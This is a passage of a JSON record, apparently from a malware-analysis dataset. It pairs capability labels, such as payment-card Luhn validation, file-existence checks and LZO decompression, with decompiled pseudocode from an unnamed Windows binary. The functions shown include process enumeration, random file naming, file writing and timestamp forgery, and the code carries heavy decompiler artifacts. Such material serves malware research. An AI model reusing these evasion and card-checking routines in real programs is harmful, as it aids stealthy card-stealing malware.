        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401dca) overlaps instruction at (ram,0x00401dc7)\n// \n// WARNING: Removing unreachable block (ram,0x00401dce)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401d70(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    bool bVar4;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar4 = false;\n    *0x421504 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407118);\n    if ((bVar4) || (!bVar4)) {\n        *0x421508 = (*pcVar1)(iVar2, 0x407134);\n        *0x42150c = (*pcVar1)(iVar2, 0x407144);\n        if ((*0x421504 == 0) || ((*0x421508 == 0 || (*0x42150c == 0)))) {\n            return 0;\n        }\n        uVar3 = 1;\n    }\n    else {\n        uVar3 = 0x98;\n    }\n    return uVar3;\n}\n",
        "token_count": 317
    },
    "004018a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401985) overlaps instruction at (ram,0x00401984)\n// \n// WARNING: Removing unreachable block (ram,0x00401975)\n// WARNING: Removing unreachable block (ram,0x004018fa)\n// WARNING: Removing unreachable block (ram,0x004018ff)\n// WARNING: Removing unreachable block (ram,0x00401985)\n\nuint __cdecl fcn.004018a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x421504)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = (**0x421508)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x0040198d:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            if ((-1 < iVar2) && (-1 >= iVar2)) {\n                out(0xc4, 0);\n                *puVar3 = 0;\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            var_4h = var_124h;\n            goto code_r0x0040198d;\n        }\n        iVar2 = (**0x42150c)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 508
    },
    "00401ae0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00401ae0(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t extraout_ECX;\n    char cVar7;\n    unkbyte3 Var8;\n    int32_t unaff_EBX;\n    uint8_t in_AF;\n    bool bVar9;\n    \n    do {\n        cVar7 = '\\0';\n        Var8 = 0;\n        uVar6 = fcn.004013f0(0x407014);\n        bVar9 = uVar6 == 0xffffffff;\n        if (bVar9) {\n            return 0;\n        }\n        if ((uVar6 < 0) || (uVar6 < 0x80000000)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return 1;\n        }\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        uVar1 = uVar6 + in_AF * '\\x06';\n        uVar3 = uVar1 & 0xf;\n        uVar2 = CONCAT11((uVar6 >> 8) + in_AF, uVar1) & 0xff0f;\n        uVar5 = uVar6 & 0xffff0000 | uVar2;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        if ((bVar9) || (!bVar9)) goto code_r0x00401a99;\n        unaff_EBX = unaff_EBX + 1;\n    } while (in_AF || unaff_EBX == 0);\n    in_AF = 9 < uVar3 | in_AF;\n    uVar5 = uVar6 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f;\n    *(uVar5 + 0x2a) = *(uVar5 + 0x2a) - unaff_EBX;\ncode_r0x00401a99:\n    uVar6 = 0;\n    bVar9 = false;\n    if (param_2 != 0) {\n        do {\n            if ((!bVar9) && (bVar9)) {\n                param_1 = param_1 + *(param_1 + 0x69 + CONCAT31(Var8, cVar7) * 4) + bVar9;\n            }\n            iVar4 = (*_sym.imp.MSVCRT.dll_rand)(unaff_EBX);\n            uVar5 = iVar4 / 0x1a;\n            Var8 = iVar4 % 0x1a >> 8;\n            cVar7 = iVar4 % 0x1a + 'a';\n            *(uVar6 + param_1) = cVar7;\n            uVar6 = uVar6 + 1;\n            bVar9 = uVar6 < param_2;\n        } while (bVar9);\n    }\n    return uVar5;\n}\n",
        "token_count": 716
    },
    "00401bc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c8a) overlaps instruction at (ram,0x00401c88)\n// \n// WARNING: Removing unreachable block (ram,0x00401c8a)\n// WARNING: Removing unreachable block (ram,0x00401c8c)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl\nfcn.00401bc0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uchar *arg_1ch, int32_t arg_20h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403000(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00403000(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    cVar6 = SCARRY4(&stack0xfffffed0, 0x14);\n    cVar5 = &stack0xfffffee4 < 0;\n    uVar1 = fcn.00403000(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n        arg_20h = arg_20h + -1;\n        puVar3 = arg_1ch | &stack0xfffffffc;\n        arg_1ch = puVar3 + 1;\n        *puVar3 = uVar1;\n    }\n    fcn.00403000(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar2 = fcn.00401b70();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar2 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar2;\n    }\n    puVar4 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_4h = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar2 = fcn.00401100(0x80000001);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar2 == 0) {\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 727
    },
    "00402030": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00402030(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    uchar extraout_DL;\n    int32_t unaff_EBX;\n    uchar *unaff_ESI;\n    uint *puVar4;\n    bool bVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    unkbyte6 Var7;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar2 = fcn.00401000();\n    if (iVar2 == 0) {\n        return false;\n    }\n    fcn.00401d70();\n    iVar2 = fcn.004018a0(0x407078);\n    bVar5 = iVar2 != -1;\n    bVar6 = iVar2 == -1;\n    if (!bVar6) {\n        return false;\n    }\n    uVar3 = fcn.00404140();\n    *0x4214fc = 1;\n    if ((!bVar6) && (bVar6)) {\n        iVar2 = extraout_ECX;\n        var_40h._0_1_ = extraout_DL;\n        if (bVar5 || unaff_EBX + 1 == 0) goto code_r0x00402114;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        unaff_ESI = unaff_ESI + 1;\n    }\n    Var7 = fcn.00401ae0();\n    bVar5 = Var7 != 0;\n    if (bVar5) {\n        return false;\n    }\n    if ((bVar5) && (!bVar5)) {\n        out(*unaff_ESI, Var7 >> 0x20);\n    }\n    var_40h._0_1_ = 0;\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar4 = &var_1fh;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    iVar2 = 7;\ncode_r0x00402114:\n    puVar4 = &var_80h + 1;\n    var_60h._0_1_ = var_40h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &var_60h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &var_40h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    iVar2 = fcn.00401510(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar2 != 0) {\n        iVar2 = fcn.004029c0(&var_20h);\n        if (iVar2 != 0) {\n            iVar2 = fcn.00402cf0(&var_80h, &var_60h, &var_20h, &var_40h);\n            return iVar2 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1025
    },
    "004028d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029a6) overlaps instruction at (ram,0x004029a3)\n// \n\nuint __cdecl fcn.004028d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    bool bVar7;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    puVar4 = &stack0xfffffffc;\n    uStack16 = 0;\n    uStack20 = 0x80;\n    uStack24 = 2;\n    uStack28 = 0;\n    uStack32 = 1;\n    uStack36 = 0x40000000;\n    uStack40 = arg_8h;\n    uStack44 = 0x4028f1;\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    bVar7 = arg_ch_00 == -1;\n    if (bVar7) {\n        return 0;\n    }\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar7) && (puVar6 = &stack0xfffffffc,  bVar7)) {\n        puVar5 = &stack0xffffffd4;\n        puVar6 = &stack0xffffffd4;\n        cVar1 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uStack44 = 0;\n    iVar3 = arg_ch_00;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar2 != 0) {\n        if (*0x4214f8 != 0) {\n            cVar1 = *0x4214f8;\n            *(arg_ch_00 + 0x43d1773a) = *(arg_ch_00 + 0x43d1773a) ^ 0xa127e95e;\n            puVar6[0x561374c0] = puVar6[0x561374c0] + cVar1 + 'P';\n            iVar3 = fcn.004027f0(iVar3);\n            *0x4214f8 = iVar3 == 0;\n        }\n        fcn.004047c0(0, arg_ch_00);\n        if (((!SCARRY4(&stack0xffffffbc, 8)) && (SCARRY4(&stack0xffffffbc, 8))) || (*0x4214f8 == 0)) {\n            puVar6[0x560775c0] = puVar6[0x560775c0] + -0x26;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 725
    },
    "004047c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004047c0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x40704c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    bVar10 = SBORROW4(arg_ch, -1);\n    iVar2 = var_4h;\n    if (arg_ch == -1) {\n        iVar2 = fcn.004013f0(arg_8h);\n        bVar10 = SBORROW4(iVar2, -1);\n        if (iVar2 == -1) {\n            return 0;\n        }\n    }\n    if ((!bVar10) && (bVar10)) {\n        LOCK();\n        iVar2 = 0x138b2633;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1222
    },
    "00404ce0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00404ce0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 88
    },
    "00401a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401a20(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401230;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "004044d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404622) overlaps instruction at (ram,0x00404620)\n// \n\nvoid fcn.004044d0(void)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint8_t extraout_CH;\n    uint8_t uVar5;\n    uint8_t extraout_DL;\n    char *unaff_EBX;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    uint8_t *puVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    uchar uVar9;\n    float10 fVar10;\n    ulong uVar11;\n    uint *puVar12;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint uVar13;\n    \n    fcn.00401800(0x407494, 0xf, 0x407390, 0x20);\n    bVar7 = false;\n    uVar9 = 0;\n    bVar8 = (extraout_DL & 0x66) == 0;\n    uVar3 = fcn.00401800(0x407494, 0xf, 0x4073b0, 0x26);\n    if ((bVar8) || (!bVar8)) {\ncode_r0x0040452e:\n        fVar10 = fcn.00401800(0x407494, 0xf, 0x4073d8, 8);\n        puVar6 = unaff_EDI;\n        if ((!uVar9) && (uVar9)) {\n            *(unaff_EDI + 0x1c) = fVar10;\n            puVar6 = unaff_EDI + 5;\n        }\n        in_stack_ffffffd0 = 0x4073e0;\n        in_stack_ffffffcc = 0xf;\n        fcn.00401800(0x407494, 0xf, 0x4073e0, 0x19);\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        uVar5 = uVar3;\n        if (!bVar7 && unaff_EBX != NULL) {\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            piVar1 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - unaff_EBX;\n            uVar9 = unaff_ESI + 1 < 0;\n            goto code_r0x0040452e;\n        }\n        puVar6 = unaff_EDI + 1;\n        *unaff_EDI = uVar5;\n    }\n    fcn.00401800(0x407494, 0xf, 0x4073fc, 0xb);\n    fcn.00401800(0x407494, 0xf, 0x407408, 0x12);\n    bVar7 = false;\n    uVar9 = unaff_EBX >> 8 == '\\0';\n    uVar4 = fcn.00401800(0x407494, 0xf, 0x40741c, 0x12);\n    if (!bVar7) {\n        if (bVar7) {\n            out(0xbd, uVar4);\n            return;\n        }\n    }\n    uVar13 = 2;\n    uVar4 = 0x404612;\n    uVar11 = fcn.00401800(0x407494, 0xf, 0x407430, 2);\n    if ((bVar7 || uVar9) || (!bVar7 && !uVar9)) {\n        uVar4 = 8;\n        in_stack_ffffffd0 = 0x407434;\n        in_stack_ffffffcc = 0xf;\n        uVar5 = extraout_CH;\n    }\n    else {\n        uVar5 = extraout_CH - *unaff_EBX;\n        *(puVar6 + 0x6a) = *(puVar6 + 0x6a) - &stack0xffffffd8;\n        puVar6 = uVar11 + 0x34;\n        *puVar6 = *puVar6 | uVar5;\n        if (*puVar6 == 0) goto code_r0x00404668;\n    }\n    pcVar2 = (uVar11 >> 0x20) + 0xf;\n    bVar7 = SCARRY1(*pcVar2, uVar5);\n    *pcVar2 = *pcVar2 + uVar5;\n    puVar12 = 0x407494;\n    fcn.00401800(0x407494, in_stack_ffffffcc, in_stack_ffffffd0, uVar4);\n    if ((!bVar7) && (bVar7)) {\n        *puVar12 = uVar13;\n        return;\n    }\n    fcn.00401800(0x407494, 0xf, 0x40743c, 8);\ncode_r0x00404668:\n    fcn.00401800(0x407494, 0xf, 0x407444, 6);\n    fcn.00401800(0x407494, 0xf, 0x40744c, 7);\n    fcn.00401800(0x407494, 0xf, 0x407454, 7);\n    fcn.00401800(0x407494, 0xf, 0x40745c, 6);\n    fcn.00401800(0x407494, 0xf, 0x407464, 0x25);\n    fcn.00401800(0x407494, 0xf, 0x40748c, 8);\n    return;\n}\n",
        "token_count": 1336
    },
    "00401ec0": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401fbe) overlaps instruction at (ram,0x00401fbd)\n// \n// WARNING: Removing unreachable block (ram,0x00401efe)\n// WARNING: Removing unreachable block (ram,0x00401f0b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl\nfcn.00401ec0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    uint var_23h;\n    uint var_4h;\n    uint *puStack8;\n    \n    puStack8 = fcn.004019a0(noname_4, noname_5, 0x407058, 7);\n    if (puStack8 == NULL) {\n        return 0;\n    }\n    if ((puStack8 < 0) || (puStack8 >= 0)) {\n        iVar5 = 7;\n    }\n    else {\n        pcVar1 = puStack8 + 0x7b92f;\n        *pcVar1 = *pcVar1 + pcVar1;\n        iVar5 = extraout_ECX;\n    }\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    puVar6 = &stack0xffffffd9;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = NULL;\n    do {\n        uVar3 = (*pcVar2)();\n        puVar4 = uVar3 & 0x800000ff;\n        if (puVar4 < 0) {\n            puVar4 = (puVar4 + -1 | 0xffffff00) + 1;\n        }\n        (&stack0xffffffd8)[puVar6] = puVar4;\n        puVar6 = puVar6 + 1;\n    } while (puVar6 < 0x20);\n    while( true ) {\n        bVar8 = false;\n        bVar10 = false;\n        bVar9 = (puVar6 & (puVar4 & 0xffff0000 | CONCAT11((puVar4 >> 8) + '\\x01', puVar4))) == 0;\n        puVar6 = &stack0xffffffd8;\n        puVar7 = puStack8;\n        for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        puVar4 = fcn.00401bc0(noname_0, noname_1, noname_2, noname_3, &stack0xffffffd8, 0x20, puStack8);\n        if (bVar8 || bVar9) break;\n        if (!bVar8 && !bVar9) break;\n        if (!bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *puVar4 = *puVar4 | puVar4;\n        *puVar4 = *puVar4 + puVar4;\n    }\n    fcn.00402780(noname_4, noname_5);\n    return 1;\n}\n",
        "token_count": 954
    },
    "004024c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004024c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4214fc == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401a80(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e8, acStack1304, &uStack2112);\n    uStack2088 = 0x407370;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 